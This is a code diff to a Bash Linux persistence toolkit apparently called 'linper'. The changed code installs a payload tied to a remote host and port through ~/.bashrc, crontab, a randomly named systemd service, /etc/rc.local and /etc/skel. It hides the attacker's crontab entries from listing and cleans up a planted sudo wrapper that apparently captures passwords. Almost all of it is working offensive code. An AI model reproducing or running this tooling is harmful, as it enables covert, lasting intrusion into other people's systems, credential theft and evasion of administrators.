@@ -17,6 +17,8 @@ SHELL="/bin/bash"
 SERVICEFILE=$(echo $(uuidgen).service)
 SERVICESHELLSCRIPT=$(echo $(uuidgen).sh)
 TMPCLEANBASHRC=$(echo /dev/shm/$(uuidgen))
+TMPCLEANBASHRC2=$(echo /dev/shm/$(uuidgen))
+TMPCLEANBASHRC3=$(echo /dev/shm/$(uuidgen))
 TMPCLEANRCLOCAL=$(echo /dev/shm/$(uuidgen))
 TMPCRON=$(echo /dev/shm/$(uuidgen))
 TMPCRONWITHPAYLOAD=$(echo /dev/shm/$(uuidgen))
@@ -170,11 +172,11 @@ stealth_modifications(){
 	then
 	if [ `$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'" | wc -l` -eq 0 ];
 	then
-		echo no crontab for $USER
+		echo no crontab for $(whoami)
 	else 
 		$REALBIN -l | grep -v "'$RHOST'" | grep -v "'$RPORT'"
 	fi
-	elif $(echo "$1 | grep -qi "\-r);
+	elif $(echo "$1 | grep -qi "\-r");
 	then
 	if $(`$REALBIN` -l | grep "'$RHOST'" | grep -qi "'$RPORT'");
 	then
@@ -242,7 +244,7 @@ enum_doors() {
 
 	DOORS=(
 	"bashrc , if test -f ~/.bashrc; then touch ~/.bashrc; else touch ~/.bashrc &&  ~/.bashrc; fi , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
-	"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD &&  $TMPCRONWITHPAYLOAD?"
+	"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && chmod +x $TMPCRONWITHPAYLOAD?"
 	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
 	"/etc/rc.local , if test -f /etc/rc.local; then touch /etc/rc.local; else touch /etc/rc.local &&  /etc/rc.local; fi , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 	"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
@@ -270,9 +272,13 @@ enum_doors() {
 							echo -e "\e[92m[+]\e[0m Door Found: $DOOR"
 							if [ "$DRYRUN" -eq 0 ];
 							then
-								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null &&
-								echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR" &&
-								COUNTER=$(expr $COUNTER + 1) && limit_checker $COUNTER
+								echo "$HINGE" | $SHELL 2> /dev/null &> /dev/null
+								if [ $? -eq 0 ];
+								then
+									echo -e "\e[92m[+]\e[0m Persistence Installed: $METHOD using $DOOR"
+									COUNTER=$(expr $COUNTER + 1)
+									limit_checker $COUNTER
+								fi
 							fi
 						fi
 					fi
@@ -382,8 +388,10 @@ cleanup() {
 
 	if $(grep -qi $1 ~/.bashrc) && $(grep -qi "function sudo" ~/.bashrc) && $(grep -qi REALSUDO ~/.bashrc) && $(grep -qi TMPPASSWORDFILE ~/.bashrc);
 	then
-		cat ~/.bashrc | sed '1,/function sudo/!d' | grep -v "function sudo" > $TMPCLEANBASHRC
-		cp $TMPCLEANBASHRC ~/.bashrc
+		grep -v "`grep -B 11 -A 5 "REALBIN -r" ~/.bashrc`" ~/.bashrc > $TMPCLEANBASHRC
+		grep -v 'if \$(echo "$1" | grep -qi "\\-l");' $TMPCLEANBASHRC > $TMPCLEANBASHRC2
+		grep -v 'elif \$(echo "$1 | grep -qi "\\-r");' $TMPCLEANBASHRC2 > $TMPCLEANBASHRC3
+		cp $TMPCLEANBASHRC3 ~/.bashrc
 		echo -e "\e[92m[+]\e[0m Removed sudo function from bashrc"
 	fi
 
